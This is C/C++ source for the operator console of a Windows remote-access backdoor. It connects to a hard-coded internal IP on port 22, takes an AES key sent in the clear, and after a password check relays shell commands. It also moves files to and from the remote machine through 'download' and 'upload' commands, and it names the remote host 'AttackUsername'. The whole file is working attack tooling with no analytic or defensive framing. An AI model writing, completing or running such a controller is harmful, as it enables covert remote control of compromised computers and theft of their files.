#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h> 
#include <iostream>
#include <openssl/aes.h>
#include <io.h>
#include <winsock2.h>
#include <Windows.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"libssl.lib")
#pragma comment(lib,"libcrypto.lib")

using namespace std;
typedef int socklen_t;
typedef struct WSAData WSAData;

SOCKET ClientSocket;
AES_KEY encrypt_key, decrypt_key;

#define HOSTNAME_COMPUTER "hostname"
#define PORT 22
#define HOST "192.168.11.130"
#define BUF_SIZE 32768

bool send_with_encrypt(char* BufferData, const int BufferLength) {
    void* OutBuffer = malloc(BufferLength);
    char* tmp = (char*)OutBuffer;
    char* tmp2 = (char*)BufferData;
    memset(OutBuffer, '\0', BufferLength);
    for (int i = 0; i < BufferLength / 16; i++) {
        AES_encrypt((unsigned char*)tmp2, (unsigned char*)tmp, &encrypt_key);
        tmp2 += 16;
        tmp += 16;
    }
    if (send(ClientSocket, (char*)OutBuffer, BufferLength, 0) < 0) {
        perror("[!]send");
        free(OutBuffer);
        return false;
    }
    memset(BufferData, '\0', BufferLength);
    free(OutBuffer);
    return true;
}

bool recv_with_decrypt(char* BufferData, const int BufferLength) {
    void* OutBuffer = malloc(BufferLength);
    char* tmp = (char*)OutBuffer;
    char* tmp2 = (char*)BufferData;
    memset(OutBuffer, '\0', BufferLength);
    memset(BufferData, '\0', BufferLength);
    if (recv(ClientSocket, (char*)BufferData, BufferLength, MSG_WAITALL) < 0) {
        perror("[!]recv");
        free(OutBuffer);
        return false;
    }
    for (int i = 0; i < BufferLength / 16; i++) {
        AES_decrypt((unsigned char*)tmp2, (unsigned char*)tmp, &decrypt_key);
        tmp2 += 16;
        tmp += 16;
    }
    memcpy(BufferData, OutBuffer, BufferLength);
    free(OutBuffer);
    return true;
}

int main(void){
    WSAData wsaData;
    WORD DllVersion = MAKEWORD(2, 2);
    if (WSAStartup(DllVersion, &wsaData) != 0) {
        printf("[!]WSAStartup error\n");
        ExitProcess(EXIT_FAILURE);
    }

    SOCKADDR_IN ServerAddress, ClientAddress;

    char BufferSend[1024];
    char BufferReceive[BUF_SIZE];

    bool is_running = true;
    char AttackUsername[256];
    int optval = 1;

    memset(&ServerAddress, 0, sizeof(ServerAddress));
    memset(&ClientAddress, 0, sizeof(ClientAddress));
    memset(BufferSend, '\0', sizeof(BufferSend));

    unsigned char seed[32];

    if ((ClientSocket = socket(PF_INET, SOCK_STREAM, 0)) < 0){
        perror("[!]socket error:");
        exit(EXIT_FAILURE);
    }

    setsockopt(ClientSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval));
    ClientAddress.sin_family = PF_INET;
    ClientAddress.sin_port = htons(1234);
    ClientAddress.sin_addr.s_addr = htons(INADDR_ANY);

    bind(ClientSocket, (struct sockaddr*)&ClientAddress, sizeof(struct sockaddr));
    ServerAddress.sin_family = PF_INET;
    ServerAddress.sin_port = htons(PORT);
    ServerAddress.sin_addr.s_addr = inet_addr(HOST);
    printf("[*]connecting to %s:%d\n", HOST, PORT);

    if (connect(ClientSocket, (struct sockaddr*)&ServerAddress, sizeof(struct sockaddr))) {
        perror("[!]connect error:");
        shutdown(ClientSocket, 2);
        closesocket(ClientSocket);
        exit(EXIT_FAILURE);
    }
    printf("[*]connected!\n");
    if (PORT == 80) {
        strcpy(BufferSend, "helloworld");
        send(ClientSocket, BufferSend, sizeof(BufferSend), 0);
    }
    if (recv(ClientSocket, BufferReceive, sizeof(BufferReceive), MSG_WAITALL) > 0) {
        printf("[*]recv AES key:%s\n", BufferReceive);
    }
    memcpy(seed, BufferReceive, sizeof(seed));
    if (AES_set_encrypt_key(seed, 128, &encrypt_key) || AES_set_decrypt_key(seed, 128, &decrypt_key)){
        printf("[!]set AES key error\n");
    }
    else {
        printf("[*]set AES key\n");
    }
    
    bool is_denied = true;
    while (is_denied) {
        printf("[*]password:\n");
        fgets(BufferSend, sizeof(BufferSend), stdin);
        char* tmp = strchr(BufferSend, '\n');
        *tmp = '\0';
        send_with_encrypt(BufferSend, sizeof(BufferSend));
        if (recv_with_decrypt(BufferReceive, sizeof(BufferReceive))){
            if (strcmp(BufferReceive, "pass")) {
                printf("[!]wrong password,please enter again!\n");
            }
            else{
                is_denied = false;
            }
        }
    }
    FILE* subprocess = NULL;
    subprocess = _popen(HOSTNAME_COMPUTER, "r");
    bool is_first = true;
    if (subprocess == NULL){
        perror("[!]error");
    }
    else{
        fgets(BufferSend, sizeof(BufferSend), subprocess);
        char* tmp = strchr(BufferSend, '\n');
        *tmp = '\0';
        strncpy(AttackUsername, BufferSend, sizeof(AttackUsername));
        _pclose(subprocess);
    }
    
    while (true){
        printf("[%s] >", AttackUsername);
        char cmd[1024]{ 0 };
        fgets(cmd, sizeof(cmd), stdin);
        char* tmp = strchr(cmd, '\n');
        *tmp = '\0';
        memcpy(BufferSend, cmd, sizeof(cmd));
        send_with_encrypt(BufferSend, sizeof(BufferSend));
        if (strncmp(cmd, "download ", 9) == 0) {
            int fileSize = 0;
            recv_with_decrypt(BufferReceive, sizeof(BufferReceive));
            if (!strstr(BufferReceive, "success")) {
                printf("[!] open file failed\n");
                continue;
            }
            printf("[*] open file success\n");
            strcpy(BufferSend, "OK");
            send_with_encrypt(BufferSend, sizeof(BufferSend));
            recv_with_decrypt((char*)&fileSize, sizeof(BufferReceive));
            if (fileSize <= 0) {
                printf("[!] get file size error\n");
                continue;
            }
            printf("[*] file size:%d bytes\n", fileSize);
            strcpy(BufferSend, "OK");
            send_with_encrypt(BufferSend, sizeof(BufferSend));
            char* tmp = cmd;
            while (*tmp != ' ') tmp++;
            while (*tmp == ' ') tmp++;
            while (*tmp != ' ') tmp++;
            while (*tmp == ' ') tmp++;
            FILE* fp = fopen(tmp, "wb+");
            if (fp == NULL) {
                perror("fopen");
                continue;
            }

            char fileBuf[BUF_SIZE];
            int blockNum = (fileSize / BUF_SIZE) + 1;
            int lastBlock = fileSize % BUF_SIZE;
            for (int i = 0; i < blockNum; i++) {
                memset(fileBuf, 0, BUF_SIZE);
                int writeSize2 = (i == blockNum - 1 ? lastBlock : BUF_SIZE);
                if (recv_with_decrypt(fileBuf, BUF_SIZE)) {
                    printf("[*] get file %d/%d\n", i, blockNum);
                    size_t nodeSize = 0;
                    while (nodeSize < writeSize2) {
                        size_t writeSize = 0;
                        if ((writeSize = fwrite(fileBuf + nodeSize, 1, writeSize2 - nodeSize, fp)) < 0) {
                            perror("[!] write file");
                            i = blockNum;
                            break;
                        }
                        else {
                            printf("[*] write file %zd bytes\n", writeSize);
                            nodeSize += writeSize;
                        }
                    }
                }
                else{
                    perror("[!] recv");
                    i = blockNum;
                }
            }
            printf("[*] write file %s success\n", tmp);
            fclose(fp);
        }
        else if (strncmp(cmd, "upload ", 7) == 0){
            unsigned char fileBuf[BUF_SIZE];
            char path[MAX_PATH];
            char* tmp = cmd;
            while (*tmp != ' ') {
                tmp++;
            }
            while (*tmp == ' ') {
                tmp++;
            }
            strcpy(path, tmp);
            tmp = path;
            while (*tmp != ' ') {
                tmp++;
            }
            *tmp = 0;
            FILE* fp = fopen(path, "rb+");
            if (!fp) {
                strcpy(BufferSend, "open file error\n");
                send_with_encrypt(BufferSend, sizeof(BufferSend));
                memset(BufferSend, '\0', sizeof(BufferSend));
                continue;
            }
            else {
                strcpy(BufferSend, "open file success\n");
                send_with_encrypt(BufferSend, sizeof(BufferSend));
                memset(BufferSend, '\0', sizeof(BufferSend));
            }
            memset(BufferSend, 0, sizeof(BufferSend));
            recv_with_decrypt(BufferReceive, sizeof(BufferReceive));

            if (strcmp(BufferReceive, "OK")) {
                printf("[!] not OK\n");
                continue;
            }
            memset(BufferReceive, '\0', sizeof(BufferReceive));
            fseek(fp, 0, SEEK_END);
            long int fileSize = ftell(fp);
            printf("[*] file size:%d\n", fileSize);
            fseek(fp, 0, SEEK_SET);
            memset(BufferSend, '\0', sizeof(BufferSend));
            memcpy(BufferSend, &fileSize, sizeof(fileSize));
            send_with_encrypt(BufferSend, sizeof(BufferSend));
            recv_with_decrypt(BufferReceive, sizeof(BufferReceive));

            if (strcmp(BufferReceive, "OK")) {
                printf("[!] not OK\n");
                continue;
            }
            memset(BufferReceive, '\0', sizeof(BufferReceive));
            int blockNum = (fileSize / BUF_SIZE) + 1;
            int lastBlock = fileSize % BUF_SIZE;
            int i = 0;
            for (i = 0; i < blockNum; i++) {
                memset(fileBuf, '\0', BUF_SIZE);
                size_t readSize2 = (i == blockNum - 1 ? lastBlock : BUF_SIZE);
                size_t nodeSize = 0;
                while (nodeSize < readSize2) {
                    size_t readSize = 0;
                    printf("[*] want read file %zd - %zd = %zd bytes\n", readSize2, nodeSize, readSize2 - nodeSize);
                    if ((readSize = fread(fileBuf + nodeSize, 1, readSize2 - nodeSize, fp)) < 0) {
                        perror("[!] read file");
                        i = blockNum;
                        break;
                    }
                    else {
                        printf("[*] read file %zd bytes\n", readSize);
                        nodeSize += readSize;
                    }
                }
                if (send_with_encrypt( (char*)fileBuf, BUF_SIZE)) {
                    printf("[*] send file %d/%d\n", i + 1, blockNum);
                }
                else {
                    perror("[!] send file");
                    break;
                }
            }
            fclose(fp);
            printf("[*] send file %s over\n", path);
        }
        else {
            if (recv_with_decrypt(BufferReceive, sizeof(BufferReceive))) {
                printf("%s", BufferReceive);
            }
        }
    }
    while (1);
    printf("[*] The server is closed !\n");
    shutdown(ClientSocket, 2);
    closesocket(ClientSocket);

    return EXIT_SUCCESS;
}
